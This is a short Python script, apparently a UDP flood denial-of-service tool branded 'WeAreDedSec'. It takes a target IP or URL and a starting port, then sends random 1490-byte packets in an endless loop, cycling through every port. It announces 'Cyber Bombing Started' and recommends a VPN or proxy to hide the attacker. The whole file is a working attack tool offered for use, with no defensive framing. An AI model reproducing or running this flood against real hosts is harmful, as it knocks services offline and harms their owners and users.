import os
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet WeAreDedSec")
print()
print("Author   : Wrench")
print("Instagram : @jeanseven")
print("github   : https://github.com/Jeanpseven")
print("USE VPN ou PROXY (recommended:https://github.com/Jeanpseven/Dr4xVPN)")
print()
target = input("IP Target or URL: ")
port = int(input("Port       : "))

os.system("clear")
os.system("figlet Cyber Bombing Started")

sent = 0
while True:
     sock.sendto(bytes, (target, port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s through port:%s" % (sent, target, port))
     if port == 65534:
       port = 1
